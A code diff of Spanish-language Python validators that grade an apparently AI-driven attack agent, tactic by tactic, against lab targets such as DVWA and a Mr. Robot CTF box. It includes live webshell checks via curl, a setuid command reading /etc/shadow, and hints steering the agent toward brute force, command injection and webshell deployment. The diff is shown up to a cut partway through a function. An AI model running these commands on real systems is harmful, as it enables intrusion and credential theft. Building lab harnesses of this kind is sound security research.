@@ -1,173 +1,247 @@
-"""
-Validadores de objetivos por tactica MITRE.
+"""Validadores de objetivos por tactica MITRE."""
 
-Cada tactica tiene un criterio concreto de exito que se verifica en codigo
-(no por el LLM) contra el action_history y collected_data del atacante.
-
-Si el objetivo NO se cumple, el grafo fuerza replanificacion con feedback
-especifico sobre lo que falta. Esto evita que el LLM declare tacticas como
-"completas" despues de 1-2 acciones superficiales.
-
-Cada validador retorna:
-  (success: bool, reason: str, extracted_evidence: dict)
-
-extracted_evidence se agrega a collected_data automaticamente.
-"""
-
+import json
+import random
 import re
+import urllib.parse
 from typing import Callable
 
 
 def _get_tactic_actions(state: dict, tactic: str) -> list[dict]:
-    """Retorna las acciones ejecutadas durante una tactica especifica."""
     return [
         a for a in state.get("action_history", [])
         if a.get("tactic", "").lower() == tactic.lower()
     ]
 
 
+_GOBUSTER_LINE_RE = re.compile(
+    r"^(\S+)\s+\(Status:\s*(\d{3})\)", re.MULTILINE
+)
+
+
+def _extract_paths_from_gobuster(actions: list[dict]) -> list[str]:
+    """Extrae rutas reales descubiertas por gobuster/run_gobuster_recursive.
+
+    Solo considera rutas con status distinto de 404, lo que evita reportar como
+    descubiertas rutas que el servidor negó. No depende de substring matching
+    sobre HTML (que confunde paths reales con referencias a assets estáticos).
+    """
+    found: set[str] = set()
+    for a in actions:
+        if a.get("technique") not in {"run_gobuster", "run_gobuster_recursive"}:
+            continue
+        for path, status in _GOBUSTER_LINE_RE.findall(a.get("output_preview", "")):
+            if status in {"200", "301", "302", "401", "403"}:
+                found.add(path.lstrip("/"))
+    return sorted(found)
+
+
+def _extract_paths_from_curl_redirects(actions: list[dict]) -> list[str]:
+    """Extrae rutas desde respuestas HTTP con código 2xx/3xx en run_curl."""
+    found: set[str] = set()
+    for a in actions:
+        if a.get("technique") not in {"run_curl", "run_command"}:
+            continue
+        out = a.get("output_preview", "")
+        if re.search(r"HTTP/[\d.]+\s+(?:200|301|302)", out):
+            cmd_args = _parse_tool_args(a.get("command", ""))
+            url = cmd_args.get("url", "")
+            m = re.search(r"https?://[^/]+(/\S*)", url)
+            if m:
+                path = m.group(1).split("?")[0].rstrip("/")
+                if path and path != "/":
+                    found.add(path.lstrip("/"))
+    return sorted(found)
+
+
 def _all_outputs(actions: list[dict]) -> str:
-    """Concatena los outputs de todas las acciones (para buscar patrones)."""
     return "\n".join(a.get("output_preview", "") for a in actions)
 
 
-def verify_reconnaissance(state: dict) -> tuple[bool, str, dict]:
-    """
-    Reconnaissance requiere:
-      1. Puerto 80 confirmado abierto via nmap
-      2. Tecnologia web identificada (Apache, WordPress, etc)
-      3. Al menos una ruta interesante descubierta (wp-login, wp-admin, etc)
-    """
-    actions = _get_tactic_actions(state, "reconnaissance")
-    outputs = _all_outputs(actions)
+def _parse_tool_args(command_json: str) -> dict:
+    try:
+        return json.loads(command_json)
+    except Exception:
+        return {}
 
+
+def _is_echo_command(cmd: str) -> bool:
+    cmd_l = cmd.strip().lower()
+    return (
+        cmd_l.startswith("echo ")
+        or cmd_l.startswith("echo\t")
+        or cmd_l.startswith("printf ")
+        or cmd_l.startswith("/bin/echo ")
+        or " | echo " in cmd_l
+        or cmd_l == "echo"
+    )
+
+
+def _verify_webshell_live(webshell_url: str) -> tuple[bool, str]:
+    try:
+        from src.infrastructure.docker_client import DockerClient
+    except Exception:
+        return False, "no se pudo importar DockerClient"
+
+    a, b = random.randint(100, 999), random.randint(100, 999)
+    expected = str(a + b)
+    marker = f"v{random.randint(10000, 99999)}"
+    cmd = f"echo -n {marker}; expr {a} + {b}"
+    encoded = urllib.parse.quote(cmd)
+    docker = DockerClient()
+    result = docker.exec_in_attacker(f"curl -s '{webshell_url}?cmd={encoded}'", timeout=15)
+    if result.exit_code != 0:
+        return False, f"webshell no respondio (exit={result.exit_code})"
+    out = result.stdout.strip()
+    if marker not in out or expected not in out:
+        return False, (
+            f"output no contiene marker+suma esperados "
+            f"(esperaba '{marker}'+'{expected}', obtuvo '{out[:80]}')"
+        )
+    return True, f"webshell operativa (marker={marker})"
+
+
+def _verify_root_live(webshell_url: str) -> tuple[bool, str]:
+    try:
+        from src.infrastructure.docker_client import DockerClient
+    except Exception:
+        return False, "no se pudo importar DockerClient"
+
+    cmd = "python3 -c 'import os; os.setuid(0); os.system(\"head -1 /etc/shadow\")'"
+    encoded = urllib.parse.quote(cmd)
+    docker = DockerClient()
+    result = docker.exec_in_attacker(f"curl -s '{webshell_url}?cmd={encoded}'", timeout=15)
+    if result.exit_code != 0:
+        return False, f"webshell no respondio (exit={result.exit_code})"
+    out = result.stdout.strip()
+    if out.startswith("root:") and len(out) > 10:
+        return True, "root confirmado (/etc/shadow leido)"
+    return False, f"lectura de /etc/shadow fallo (obtuvo: {out[:80]})"
+
+
+def verify_reconnaissance(state: dict) -> tuple[bool, str, dict]:
+    actions = _get_tactic_actions(state, "reconnaissance")
     evidence = {}
     missing = []
 
-    # 1. Puerto 80 abierto
-    if re.search(r"80/tcp\s+open", outputs):
-        evidence["port_80_open"] = True
+    nmap_actions = [a for a in actions if a.get("technique") == "run_nmap"]
+    if not nmap_actions:
+        missing.append("nmap no invocado")
     else:
-        missing.append("nmap no confirmo puerto 80/tcp abierto (ejecuta run_nmap con -p-)")
+        nmap_out = _all_outputs(nmap_actions)
+        if re.search(r"80/tcp\s+open", nmap_out):
+            evidence["port_80_open"] = True
+        else:
+            missing.append("nmap ejecutado pero no se confirmo 80/tcp open")
 
-    # 2. Tecnologia web
+    web_tools = {"run_nikto", "run_gobuster", "run_curl", "run_wpscan", "run_command"}
+    web_actions = [a for a in actions if a.get("technique") in web_tools]
+    if not web_actions:
+        missing.append("ninguna herramienta de enumeracion web invocada")
+
+    all_out = _all_outputs(actions)
     web_tech = []
-    if "Apache" in outputs:
-        web_tech.append("Apache")
-    if re.search(r"wordpress|wp-login|wp-admin|wp-content", outputs, re.IGNORECASE):
-        web_tech.append("WordPress")
-    if "PHP" in outputs:
-        web_tech.append("PHP")
+    for pattern, name in [
+        (r"\bApache\b", "Apache"),
+        (r"\bnginx\b", "nginx"),
+        (r"\bIIS\b", "IIS"),
+        (r"wordpress|wp-login|wp-admin|wp-content", "WordPress"),
+        (r"\bDVWA\b|dvwa", "DVWA"),
+        (r"\bDrupal\b", "Drupal"),
+        (r"\bJoomla\b", "Joomla"),
+        (r"\bPHP\b", "PHP"),
+        (r"\bMySQL\b", "MySQL"),
+    ]:
+        if re.search(pattern, all_out, re.IGNORECASE):
+            web_tech.append(name)
     if web_tech:
         evidence["web_technologies"] = web_tech
     else:
-        missing.append("no se identifico tecnologia web (ejecuta run_nikto o run_gobuster)")
+        missing.append("no se identifico tecnologia web")
 
-    # 3. Rutas interesantes
-    interesting_paths = set()
-    for path in ["/robots.txt", "/wp-login.php", "/wp-admin", "/license.txt", "/wp-content"]:
-        if path in outputs:
-            interesting_paths.add(path)
-    if interesting_paths:
-        evidence["discovered_paths"] = sorted(interesting_paths)
+    paths = _extract_paths_from_gobuster(web_actions)
+    if not paths:
+        paths = _extract_paths_from_curl_redirects(web_actions)
+    if paths:
+        evidence["discovered_paths"] = sorted(paths)[:15]
     else:
-        missing.append("no se descubrio ninguna ruta sensible (ejecuta run_gobuster)")
-
-    # Extra: si el output contiene key-1-of-3.txt (mencionado en robots.txt),
-    # lo dejamos anotado pero NO lo contamos como key capturada aun — lo es
-    # cuando efectivamente se lee el contenido.
-    key1_match = re.search(r"^([0-9a-f]{32})\s*$", outputs, re.MULTILINE)
-    if key1_match and "key-1-of-3" in outputs:
-        evidence["key_1"] = key1_match.group(1)
+        missing.append("no se descubrio ninguna ruta via gobuster u otros tools web")
 
     if missing:
         return False, "; ".join(missing), evidence
 
-    return (
-        True,
-        f"Puerto 80 abierto, tech={web_tech}, paths={sorted(interesting_paths)}",
-        evidence,
-    )
+    return True, f"Puerto 80 open, tech={web_tech}, paths={sorted(paths)[:3]}", evidence
 
 
 def verify_initial_access(state: dict) -> tuple[bool, str, dict]:
-    """
-    Initial Access requiere:
-      1. Credenciales WordPress encontradas (usuario + password)
-      2. Login exitoso via POST a /wp-login.php con respuesta 302 a /wp-admin/
-    """
     actions = _get_tactic_actions(state, "initial_access")
-    outputs = _all_outputs(actions)
-
     evidence = {}
     missing = []
 
-    # 1. Credenciales
-    # Patron 1: formato user:password (sin espacios alrededor de :)
-    creds_match = re.search(
-        r"\b(elliot|admin|robot)[:\s]+([A-Za-z0-9\-!@#\$%^&*()_]{4,})",
-        outputs,
-    )
-    if creds_match:
-        evidence["wp_user"] = creds_match.group(1)
-        evidence["wp_password"] = creds_match.group(2)
-    else:
-        # Patron 2: busqueda en base64 decodificado
-        import base64
-        b64_matches = re.findall(r"[A-Za-z0-9+/]{12,}={0,2}", outputs)
-        for b64 in b64_matches:
-            try:
-                decoded = base64.b64decode(b64 + "==").decode("utf-8", errors="ignore")
-                m = re.search(r"\b(\w+)\s*:\s*([A-Za-z0-9\-!@#\$%^&*()_]{4,})", decoded)
-                if m:
-                    evidence["wp_user"] = m.group(1)
-                    evidence["wp_password"] = m.group(2).strip()
-                    break
-            except Exception:
-                continue
-    # Patron 3: si hay un POST a wp-login con log= y pwd=, extraer de ahi
-    if "wp_user" not in evidence:
+    outputs = _all_outputs(actions)
+    creds_user = None
+    creds_pass = None
+    credentials_source = None
+
+    m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", outputs, re.IGNORECASE)
+    if m:
+        creds_user = m.group(1)
+        creds_pass = m.group(2)
+        credentials_source = "hydra"
+
+    if not creds_user:
         for action in actions:
             cmd = action.get("command", "")
-            m = re.search(r"log=(\w+)[^&]*&pwd=([^&'\"]+)", cmd)
-            if m:
-                evidence["wp_user"] = m.group(1)
-                evidence["wp_password"] = m.group(2)
+            out = action.get("output_preview", "")
+            args = _parse_tool_args(cmd)
+            if args.get("login_url") and args.get("login_data"):
+                if _is_login_success(out):
+                    extracted = _extract_post_credentials(args.get("login_data", ""))
+                    if extracted:
+                        creds_user, creds_pass = extracted
+                        credentials_source = "http_session"
+                        break
+            if not _is_login_post(cmd):
+                continue
+            if not _is_login_success(out):
+                continue
+            extracted = _extract_post_credentials(cmd)
+            if extracted:
+                creds_user, creds_pass = extracted
+                credentials_source = "direct_verify"
                 break
-    if "wp_user" not in evidence:
-        missing.append("no se encontraron credenciales (revisa /robots.txt y /license.txt)")
 
-    # 2. Login exitoso: busca una peticion POST a wp-login.php cuya respuesta
-    # contenga status 302. WordPress SIEMPRE redirige a /wp-admin/ cuando el login
-    # es exitoso (200 = formulario de error, 302 = exito). No necesitamos verificar
-    # el header Location explicitamente porque puede estar truncado en el preview.
-    login_success = False
-    login_action_cmd = ""
-    for action in actions:
-        out = action.get("output_preview", "")
-        cmd = action.get("command", "")
-        # Patrones que indican un POST curl con credenciales al login de WordPress
-        is_wp_login_post = (
-            "wp-login" in cmd
-            and "log=" in cmd
-            and "pwd=" in cmd
+    if not creds_user:
+        missing.append(
+            "credenciales no verificadas (usa hydra contra el login "
+            "o verifica credenciales descubiertas con un POST autenticado)"
         )
-        if is_wp_login_post and ("302 Found" in out or "HTTP/1.1 302" in out or "HTTP/2 302" in out):
-            login_success = True
-            login_action_cmd = cmd[:120]
+    else:
+        evidence["username"] = creds_user
+        evidence["password"] = creds_pass
+        evidence["credentials_source"] = credentials_source
+
+    login_verified = False
+    for action in actions:
+        cmd = action.get("command", "")
+        out = action.get("output_preview", "")
+        if _is_login_post(cmd) and _is_login_success(out):
+            login_verified = True
             break
-        # Alternativa: login con hydra — busca "host:port login: X password: Y"
-        if "hydra" in cmd and re.search(r"login:\s*\S+.*password:\s*\S+", out):
-            login_success = True
-            login_action_cmd = cmd[:120]
+        args = _parse_tool_args(cmd)
+        if args.get("login_url") and _is_login_success(out):
+            login_verified = True
+            break
+        if "hydra" in cmd and re.search(r"login:.*password:", out):
+            login_verified = True
             break
 
-    if login_success:
-        evidence["wp_login_verified"] = True
+    if login_verified:
+        evidence["login_verified"] = True
     else:
         missing.append(
-            "no se verifico login exitoso (necesitas POST a /wp-login.php "
-            "con respuesta 302 Location: /wp-admin/)"
+            "login no verificado (POST con credenciales debe retornar 302 "
+            "o respuesta indicando sesion exitosa)"
         )
 
     if missing:
@@ -175,271 +249,383 @@ def verify_initial_access(state: dict) -> tuple[bool, str, dict]:
 
     return (
         True,
-        f"Credenciales {evidence.get('wp_user')}:{evidence.get('wp_password')}, login 302 confirmado",
+        f"Credenciales {creds_user}:{creds_pass} verificadas via {credentials_source}",
         evidence,
     )
+
+
+def _is_login_post(cmd: str) -> bool:
+    """Detecta un comando que hace POST a un endpoint de login."""
+    cmd_l = cmd.lower()
+    if "post" not in cmd_l and "-d " not in cmd_l and "-d'" not in cmd_l:
+        return False
+    login_hints = [
+        "wp-login", "/login", "login.php", "signin", "authenticate",
+        "log=", "username=", "user=", "email=",
+    ]
+    pass_hints = ["pwd=", "password=", "passwd=", "pass="]
+    has_login = any(h in cmd_l for h in login_hints)
+    has_pass = any(h in cmd_l for h in pass_hints)
+    return has_login and has_pass
+
+
+def _is_login_success(response: str) -> bool:
+    """Detecta evidencia HTTP de login exitoso en el output de una peticion.
+
+    Distincion clave: apps como DVWA retornan 302 Location: login.php en fallo,
+    no solo en exito. Un 302 cuyo destino es el mismo endpoint de login NO es
+    evidencia de autenticacion exitosa.
+    """
+    if re.search(r"HTTP/[\d.]+\s+30[12]", response):
+        # Redirect de vuelta al propio login = fallo (DVWA, Drupal, etc.)
+        if re.search(
+            r"Location:\s*[^\r\n]*(?:login|signin|signon|auth|session)(?:\.php|\.html|\.asp|/)?\b",
+            response,
+            re.IGNORECASE,
+        ):
+            return False
+        # Redirect a pagina protegida/interna = exito
+        if re.search(
+            r"Location:\s*/?(wp-admin|admin|dashboard|home|index|user|profile|vulnerabilities)",
+            response,
+            re.IGNORECASE,
+        ):
+            return True
+        # Cualquier otro 302 a ruta distinta de login tambien cuenta como exito
+        if re.search(r"Location:\s*\S+", response):
+            return True
+    # Set-Cookie con session token indica sesion creada
+    if re.search(r"Set-Cookie:\s*[^\n]*session[^\n]*=[^\s;]+", response, re.IGNORECASE):
+        if not re.search(r"(invalid|error|incorrect|denied)", response, re.IGNORECASE):
+            return True
+    return False
+
+
+def _extract_post_credentials(cmd: str) -> tuple[str, str] | None:
+    """Extrae username + password del body de un POST de login."""
+    for user_key, pass_key in [
+        ("log", "pwd"),
+        ("username", "password"),
+        ("user", "pass"),
+        ("email", "password"),
+    ]:
+        pattern = rf"{user_key}=([^&'\"\s]+)[^&]*&{pass_key}=([^&'\"\s]+)"
+        m = re.search(pattern, cmd, re.IGNORECASE)
+        if m:
+            return m.group(1), m.group(2)
+    return None
 
 
 def verify_execution(state: dict) -> tuple[bool, str, dict]:
     """
-    Execution requiere:
-      1. Webshell desplegada via theme-editor (POST con action=editedfile + _wpnonce)
-      2. Webshell verificada: run_web_shell con cmd=id o uname retorna output real
-         del sistema (uid=, Linux, etc), NO HTML 404
+    Acepta RCE verificada por cualquier tool (web_shell, curl, command, sqlmap)
+    cuyo output muestre ejecucion real de comandos en el target.
     """
     actions = _get_tactic_actions(state, "execution")
     evidence = {}
     missing = []
 
-    # 1. Deploy via theme-editor
-    deployed = any(
-        "theme-editor" in a.get("command", "") and "action=editedfile" in a.get("command", "")
-        for a in actions
-    )
-    if deployed:
-        evidence["webshell_deploy_attempted"] = True
+    target = state.get("target", "")
 
-    # 2. Webshell operativa: algun run_web_shell con output real del sistema
-    webshell_verified = False
+    def _has_real_system_output(text: str) -> bool:
+        """Detecta evidencia de ejecucion real en el target.
+
+        Acepta tanto output crudo (webshell/curl directo) como output dentro
+        de HTML (apps con form vulnerable que reflejan el resultado del comando
+        en un <pre>, ej: DVWA, command injection en formularios web).
+        """
+        patterns = [
+            r"\buid=\d+\([^)]+\)\s+gid=\d+",
+            r"^Linux\s+\S+\s+[\d.]+",
+            r"^\w+\s+\d+\s+\d+:\d+:\d+",
+            r"^PID\s+TTY",
+            r"^root:[^:]*:0:0:",
+            r"\bGNU/Linux\b",
+        ]
+        return any(re.search(p, text, re.MULTILINE) for p in patterns)
+
     webshell_url = None
+    rce_via_tool = False
+    rce_source = None
+
     for action in actions:
-        if action.get("technique") != "run_web_shell":
-            continue
+        tool_name = action.get("technique", "")
+        cmd = action.get("command", "")
         out = action.get("output_preview", "")
-        # Output tipico de id: uid=33(www-data) gid=33(www-data)
-        # Output tipico de uname: Linux ...
-        # Output NO valido: contiene "<!DOCTYPE" o "<html" (es un error 404 HTML)
-        is_html_error = "<!DOCTYPE" in out or "<html" in out.lower()
-        has_system_output = bool(
-            re.search(r"\buid=\d+", out)
-            or re.search(r"^Linux\s+", out, re.MULTILINE)
-            or re.search(r"\bgid=\d+", out)
-        )
-        if has_system_output and not is_html_error:
-            webshell_verified = True
-            # Extraer URL de la webshell del comando
-            cmd = action.get("command", "")
-            url_match = re.search(r'"url":\s*"([^"]+)"', cmd)
-            if url_match:
-                webshell_url = url_match.group(1)
-            evidence["webshell_verified_output"] = out[:200]
-            break
 
-    if webshell_verified:
-        evidence["webshell_operational"] = True
-        if webshell_url:
-            evidence["webshell_url"] = webshell_url
-    else:
+        if tool_name == "run_web_shell":
+            args = _parse_tool_args(cmd)
+            if _is_echo_command(args.get("cmd", "")):
+                continue
+            if _has_real_system_output(out):
+                webshell_url = args.get("url", "")
+                rce_source = "run_web_shell"
+                break
+            continue
+
+        if tool_name in {"run_curl", "run_command", "run_sqlmap", "run_http_session"}:
+            if target and target not in cmd and target not in out:
+                continue
+            if _has_real_system_output(out):
+                rce_via_tool = True
+                rce_source = tool_name
+                break
+
+    if rce_source is None:
         missing.append(
-            "webshell no verificada (run_web_shell debe retornar output real "
-            "del sistema como uid=33 o Linux, NO HTML 404)"
+            "RCE no verificada: ninguna herramienta retorno output real del sistema "
+            "(uid=, Linux kernel version, /etc/passwd, etc). Intenta un vector de "
+            "command injection, file upload, o deploy de webshell."
         )
-
-    if missing:
         return False, "; ".join(missing), evidence
 
-    return (
-        True,
-        f"Webshell operativa en {webshell_url or 'desconocido'}",
-        evidence,
-    )
+    if webshell_url:
+        evidence["webshell_url"] = webshell_url
+        live_ok, live_reason = _verify_webshell_live(webshell_url)
+        if live_ok:
+            evidence["webshell_live_verified"] = True
+            return True, f"Webshell operativa en {webshell_url}", evidence
+        missing.append(f"verificacion live de webshell fallo: {live_reason}")
+        return False, "; ".join(missing), evidence
+
+    if rce_via_tool:
+        evidence["rce_via"] = rce_source
+        evidence["rce_verified"] = True
+        return True, f"RCE verificada via {rce_source}", evidence
+
+    return False, "RCE no verificada", evidence
+
+
+_EXECUTION_VECTORS = {"run_web_shell", "run_http_session", "run_curl", "run_command", "run_sqlmap"}
+_ENUM_KEYWORDS = ["uname", "whoami", " id ", "/etc/passwd", "/home", "hostname", "ifconfig", "ip a", "ls /"]
+
+
+def _real_execution_actions(actions: list[dict]) -> list[dict]:
+    """Devuelve acciones que ejecutaron comandos reales en el target.
+
+    Acepta cualquier vector de ejecucion: webshell, command injection via
+    run_http_session, run_curl con RCE por parametro, etc. Filtra comandos echo
+    y comandos shell que no tocaron el target.
+    """
+    real = []
+    for action in actions:
+        tool = action.get("technique", "")
+        if tool not in _EXECUTION_VECTORS:
+            continue
+        args = _parse_tool_args(action.get("command", ""))
+        user_cmd = args.get("cmd") or args.get("target_data") or args.get("data") or ""
+        if _is_echo_command(user_cmd):
+            continue
+        real.append(action)
+    return real
 
 
 def verify_discovery(state: dict) -> tuple[bool, str, dict]:
-    """
-    Discovery requiere:
-      1. Enumeracion basica del sistema (uname, whoami, id)
-      2. Lectura de /etc/passwd o enumeracion de /home
-      3. Descubrimiento del hash de robot (formato MD5 de 32 chars hex)
+    """Discovery es versatil: acepta enumeracion del sistema via cualquier
+    vector de ejecucion (webshell, command injection, RCE por curl).
     """
     actions = _get_tactic_actions(state, "discovery")
-    outputs = _all_outputs(actions)
     evidence = {}
     missing = []
 
-    # 1. Enumeracion del sistema
-    enum_commands = {"uname", "whoami", "id"}
-    enum_done = any(
-        any(cmd in a.get("command", "").lower() for cmd in enum_commands)
-        for a in actions
+    real_exec_actions = _real_execution_actions(actions)
+    if not real_exec_actions:
+        missing.append("discovery requiere ejecutar comandos en el target (via webshell, command injection, o RCE)")
+        return False, "; ".join(missing), evidence
+
+    all_out = _all_outputs(real_exec_actions)
+
+    uname_match = re.search(r"Linux\s+\S+\s+[\d.]+", all_out)
+    if uname_match:
+        evidence["target_uname"] = uname_match.group(0)[:100]
+
+    user_match = re.search(r"uid=\d+\(([^)]+)\)", all_out)
+    if user_match:
+        evidence["target_user"] = user_match.group(1)
+
+    passwd_match = re.search(r"^(root:x:0:0:|[a-z_][a-z0-9_-]*:x:\d+:\d+:)", all_out, re.MULTILINE)
+    if passwd_match:
+        evidence["etc_passwd_read"] = True
+
+    enum_done = (
+        "target_uname" in evidence
+        or "target_user" in evidence
+        or "etc_passwd_read" in evidence
     )
-    if enum_done:
-        evidence["system_enumerated"] = True
-        # Extraer info
-        uname_match = re.search(r"Linux\s+\S+\s+[\d.]+", outputs)
-        if uname_match:
-            evidence["target_uname"] = uname_match.group(0)[:100]
-        user_match = re.search(r"uid=\d+\(([^)]+)\)", outputs)
-        if user_match:
-            evidence["target_user"] = user_match.group(1)
-    else:
+    if not enum_done:
+        for action in real_exec_actions:
+            args = _parse_tool_args(action.get("command", ""))
+            user_cmd = (args.get("cmd") or args.get("target_data") or args.get("data") or "").lower()
+            if any(k in user_cmd for k in _ENUM_KEYWORDS):
+                out = action.get("output_preview", "")
+                if out.strip() and len(out.strip()) > 20:
+                    enum_done = True
+                    evidence["system_enumerated"] = True
+                    break
+
+    if not enum_done:
         missing.append(
-            "no se ejecuto enumeracion basica (corre uname, whoami o id via webshell)"
+            "enumeracion del sistema no verificada: ejecuta uname -a, id, "
+            "whoami o cat /etc/passwd y confirma que la respuesta contiene output real"
         )
 
-    # 2. Descubrimiento de /home
-    home_explored = any(
-        "/home" in a.get("command", "") or "/etc/passwd" in a.get("command", "")
-        for a in actions
+    hash_match = re.search(
+        r"\b([a-z_][a-z0-9_]+):\$?[a-z0-9]{1,4}\$?([a-zA-Z0-9./$]{16,})\b",
+        all_out,
     )
-    if home_explored:
-        evidence["home_explored"] = True
-    else:
-        missing.append("no se exploro /home ni /etc/passwd")
-
-    # 3. Hash MD5 de robot descubierto
-    # Buscar patron robot:<32 hex chars>
-    hash_match = re.search(r"robot\s*:\s*([a-f0-9]{32})", outputs, re.IGNORECASE)
+    if not hash_match:
+        hash_match = re.search(
+            r"\b([a-z_][a-z0-9_]+):([a-f0-9]{16,128})\b",
+            all_out,
+            re.IGNORECASE,
+        )
     if hash_match:
-        evidence["robot_md5_hash"] = hash_match.group(1)
-    else:
-        missing.append(
-            "hash MD5 de robot no encontrado (lee /home/robot/password.raw-md5 via webshell)"
-        )
-
-    # Extra: si al listar /home se encontro y leyo key-1 o key-2, capturarlo
-    for action in actions:
-        cmd = action.get("command", "")
-        out = action.get("output_preview", "")
-        if "key-1-of-3" in cmd:
-            m = re.search(r"\b([a-f0-9]{32})\b", out)
-            if m and m.group(1) != evidence.get("robot_md5_hash"):
-                evidence["key_1"] = m.group(1)
-        if "key-2-of-3" in cmd:
-            m = re.search(r"\b([a-f0-9]{32})\b", out)
-            if m and m.group(1) != evidence.get("robot_md5_hash"):
-                evidence["key_2"] = m.group(1)
+        evidence["discovered_user"] = hash_match.group(1)
+        evidence["discovered_hash"] = hash_match.group(2)
 
     if missing:
         return False, "; ".join(missing), evidence
 
-    return (
-        True,
-        f"Sistema enumerado, hash robot:{evidence.get('robot_md5_hash', '?')[:12]}...",
-        evidence,
-    )
+    parts = []
+    if "target_user" in evidence:
+        parts.append(f"user={evidence['target_user']}")
+    if "target_uname" in evidence:
+        parts.append("uname ok")
+    if "etc_passwd_read" in evidence:
+        parts.append("passwd leido")
+    if "discovered_hash" in evidence:
+        parts.append(f"hash={evidence['discovered_user']}:{evidence['discovered_hash'][:12]}...")
+    return True, "Sistema enumerado (" + ", ".join(parts) + ")", evidence
 
 
 def verify_credential_access(state: dict) -> tuple[bool, str, dict]:
-    """
-    Credential Access requiere:
-      1. Ejecucion de john contra el hash descubierto
-      2. Hash crackeado (password en texto plano)
-    """
     actions = _get_tactic_actions(state, "credential_access")
-    outputs = _all_outputs(actions)
     evidence = {}
     missing = []
 
-    # 1. john ejecutado
-    john_run = any(a.get("technique") == "run_john" for a in actions)
-    if not john_run:
-        missing.append("john no ejecutado (usa run_john con el hash descubierto)")
+    john_actions = [a for a in actions if a.get("technique") == "run_john"]
+    if not john_actions:
+        missing.append("run_john no invocado")
+        return False, "; ".join(missing), evidence
 
-    # 2. Password crackeado
-    # Output tipico de john --show: "robot:abcdefghijklmnopqrstuvwxyz:..."
-    # O: "robot         (abcdefghijklmnopqrstuvwxyz)"
+    prior_hashes = set()
+    for a in state.get("action_history", []):
+        if a.get("tactic") == "discovery":
+            matches = re.findall(r"\b[a-f0-9]{16,128}\b", a.get("output_preview", ""))
+            prior_hashes.update(matches)
+
+    hash_used = None
+    for action in john_actions:
+        args = _parse_tool_args(action.get("command", ""))
+        hash_content = args.get("hash_content", "")
+        m = re.search(r"([a-f0-9]{16,128})", hash_content)
+        if m:
+            hash_used = m.group(1)
+            break
+
+    if not hash_used:
+        missing.append("run_john llamado pero sin hash valido en hash_content")
+    elif prior_hashes and hash_used not in prior_hashes:
+        missing.append(
+            f"el hash pasado a john no coincide con el descubierto en Discovery "
+            f"(usaste {hash_used[:12]}...)"
+        )
+    else:
+        evidence["hash_cracked_input"] = hash_used
+
     cracked = None
-    # Patron 1: john --show
-    m = re.search(r"robot:([^\s:]+)(?::|$)", outputs)
-    if m and m.group(1) not in ("!", ""):
-        cracked = m.group(1)
-    # Patron 2: john durante crack
+    outputs = _all_outputs(john_actions)
+    m = re.search(r"^(\w+):([^\s:]+)::?", outputs, re.MULTILINE)
+    if m and m.group(2) not in ("!", "", "*"):
+        cracked = m.group(2)
     if not cracked:
-        m = re.search(r"([\w]+)\s+\(robot\)", outputs)
+        m = re.search(r"([^\s]+)\s*\(\w+\)\s*$", outputs, re.MULTILINE)
         if m:
             cracked = m.group(1)
-    # Patron 3: "password hash cracked" — buscar palabras del wordlist
     if not cracked:
-        # john imprime "1 password hash cracked"
-        if "password hash cracked" in outputs.lower():
-            # Buscar en las acciones por algo con formato "robot : <something>"
-            m = re.search(r"robot[:\s]+([a-z]+)\b", outputs)
-            if m:
-                cracked = m.group(1)
-
-    if cracked:
-        evidence["robot_password"] = cracked
+        missing.append("password no crackeado")
     else:
-        missing.append("password no crackeado (john debe retornar la contrasena en texto plano)")
-
-    # Extra: si durante la tactica se leyo /home/robot/key-2-of-3.txt, capturarlo
-    for action in actions:
-        cmd = action.get("command", "")
-        out = action.get("output_preview", "")
-        if "key-2-of-3" in cmd:
-            m = re.search(r"\b([a-f0-9]{32})\b", out)
-            if m:
-                evidence["key_2"] = m.group(1)
+        evidence["cracked_password"] = cracked
 
     if missing:
         return False, "; ".join(missing), evidence
 
-    return True, f"Password de robot crackeado: {cracked}", evidence
+    return True, f"Hash crackeado: {cracked}", evidence
 
 
 def verify_privilege_escalation(state: dict) -> tuple[bool, str, dict]:
-    """
-    Privilege Escalation requiere:
-      1. Binarios SUID enumerados
-      2. Explotacion exitosa: comando ejecutado como root (uid=0)
-         O lectura de /root/key-3-of-3.txt
+    """Privilege escalation es versatil: acepta cualquier evidencia de uid=0
+    en output real del target, sin importar el vector (webshell, command
+    injection, SUID, sudo).
     """
     actions = _get_tactic_actions(state, "privilege_escalation")
-    outputs = _all_outputs(actions)
     evidence = {}
     missing = []
 
-    # 1. SUID enumerados
-    suid_enumerated = any(
-        "-perm" in a.get("command", "") and "u=s" in a.get("command", "")
-        for a in actions
-    )
+    real_exec_actions = _real_execution_actions(actions)
+    all_out = _all_outputs(real_exec_actions)
+
+    suid_enumerated = False
+    for action in real_exec_actions:
+        args = _parse_tool_args(action.get("command", ""))
+        user_cmd = (args.get("cmd") or args.get("target_data") or args.get("data") or "")
+        if "-perm" in user_cmd and ("u=s" in user_cmd or "4000" in user_cmd):
+            suid_enumerated = True
+            break
     if suid_enumerated:
         evidence["suid_enumerated"] = True
-        # Extraer binarios SUID encontrados
-        suid_bins = re.findall(r"^(/\S+(?:python|nmap|perl|ruby|php|bash|vi|less|find|cp)\S*)", outputs, re.MULTILINE)
-        if suid_bins:
-            evidence["suid_binaries"] = suid_bins[:10]
 
-    # 2. Root obtenido: buscar uid=0(root) en algun output, O contenido del key-3
-    root_gained = False
-    if re.search(r"uid=0\(root\)", outputs):
-        root_gained = True
-        evidence["root_uid_confirmed"] = True
+    root_confirmed = False
+    if re.search(r"uid=0\(root\)", all_out):
+        root_confirmed = True
+        evidence["uid_0_observed"] = True
+    elif re.search(r"^root:[^:]*:0:0:", all_out, re.MULTILINE):
+        shadow_match = re.search(r"^root:[^\s:]{10,}:", all_out, re.MULTILINE)
+        if shadow_match:
+            root_confirmed = True
+            evidence["shadow_root_hash"] = True
 
-    # Lectura de /root/key-3-of-3.txt
-    key3_read = False
-    if re.search(r"/root/key-3-of-3\.txt", " ".join(a.get("command", "") for a in actions)):
-        # Verificar que el output tiene contenido plausible de un flag (hash de 32 chars)
-        for action in actions:
-            if "/root/key-3" in action.get("command", ""):
-                out = action.get("output_preview", "")
-                # Flag tipico es hash MD5 (32 hex chars) o string similar
-                if re.search(r"[a-f0-9]{32}", out) or (out.strip() and "Permission denied" not in out and "<!DOCTYPE" not in out):
-                    key3_read = True
-                    m = re.search(r"([a-f0-9]{32})", out)
-                    if m:
-                        evidence["key_3"] = m.group(1)
-                    break
+    webshell_url = ""
+    tactic_evidence = state.get("tactic_evidence", {})
